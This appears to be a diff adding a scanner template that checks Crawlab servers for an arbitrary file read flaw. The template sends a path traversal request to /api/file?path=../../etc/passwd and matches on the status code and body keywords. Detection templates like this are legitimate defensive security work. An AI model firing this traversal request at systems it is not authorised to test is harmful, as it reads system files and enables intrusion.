@@ -1,0 +1,23 @@
+id: crawlab-lfi
+brief:
+    title: Crawlab - Arbitrary File Read
+    by: pussycat0x
+    level: high
+    about: Crawlab is vulnerable to arbitrary file read.
+    label:
+        - crawlab
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/file?path=../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - data":"
+            - 'error":'
+          in: body
+        - "on": status
+          status:
+            - 200
